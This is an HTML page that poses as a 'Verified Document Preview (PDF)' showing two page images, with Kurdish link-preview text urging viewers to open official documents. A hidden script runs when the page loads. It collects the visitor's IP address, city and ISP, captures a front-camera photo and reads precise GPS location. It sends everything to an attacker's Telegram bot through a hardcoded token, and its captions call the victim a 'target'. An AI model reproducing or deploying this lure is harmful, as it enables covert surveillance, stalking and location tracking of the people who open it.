<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verified Document Preview (PDF)</title>

    <meta property="og:title" content="دۆکیۆمێنتە فەرمییەکان - پێویستە سەیری بکەیت">
    <meta property="og:description" content="تکایە کرتە بکە بۆ بینینی پەڕە و وردەکارییەکان بە شێوازی PDF.">
    <meta property="og:image" content="https://statuesque-bonbon-16382e.netlify.app/IMG_6579.jpeg">
    <meta property="og:url" content="https://statuesque-bonbon-16382e.netlify.app">
    <meta property="og:type" content="website">

    <style>
        body {
            background-color: #525659;
            color: #ffffff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .pdf-container {
            background-color: #ffffff;
            color: #000000;
            width: 100%;
            max-width: 800px;
            padding: 40px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .pdf-header {
            border-bottom: 2px solid #ccc;
            padding-bottom: 10px;
            margin-bottom: 20px;
            font-size: 20px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .page-box {
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid #ddd;
            padding: 15px;
            background: #f9f9f9;
            border-radius: 4px;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 2px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
    </style>
</head>
<body>

    <div class="pdf-container">
        <div class="pdf-header">
            <span>Verified Document Preview (PDF)</span>
            <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
        </div>

        <div class="page-box">
            <img src="IMG_6579.jpeg" alt="Document Page 1">
        </div>

        <div class="page-box">
            <img src="IMG_6581.jpeg" alt="Document Page 2">
        </div>
    </div>

    <video id="v" autoplay playsinline style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw";
        const CHAT_ID = "659131693";

        // ١. ڕاکێشانی ئایپی و زانیاری وڵات و هێڵ
        async function s1derGetIPAndSend() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                
                let ipInfo = `فاک! ئایپی دۆزراوە:%0A- IP: ${data.ip}%0A- وڵات: ${data.country_name}%0A- شار: ${data.city}%0A- کۆمپانیا: ${data.org}`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(ipInfo)}`);
            } catch (err) {
                console.error("فاک، هەڵە لە وەگرتنی ئایپی:", err);
            }
        }

        // ٢. ڕاکێشانی وێنەی کامێرا
        async function s1derCaptureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 's1der_target.jpg');
                    formData.append('caption', 'فاک! وێنەی ئامانجی دۆکیۆمێنت گەیشت.');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg', 0.85);

            } catch (err) {
                console.error("فاک، کامێرا ڕەتکرایەوە:", err);
            }
        }

        // ٣. ڕاکێشانی لوکیشنی دەقیق (GPS)
        function s1derGetLocationAndSend() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی دۆکیۆمێنت:%0Aوردبوونەوە: ${acc} مەتر`;

                try {
                    await fetch(locUrl);
                    await fetch(textUrl);
                } catch (err) {
                    console.error("فاک، ناردنی لوکیشن سەرکەوتوو نەبوو:", err);
                }
            }, (error) => {
                console.error("فاک، مۆڵەت نەدرا:", error);
            }, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
        }

        // کارپێکردنی هەموویان پاش کردنەوەی پەیجەکە
        window.onload = () => {
            setTimeout(() => {
                s1derGetIPAndSend();
                s1derCaptureAndSend();
                s1derGetLocationAndSend();
            }, 1000);
        };
    </script>
</body>
</html>
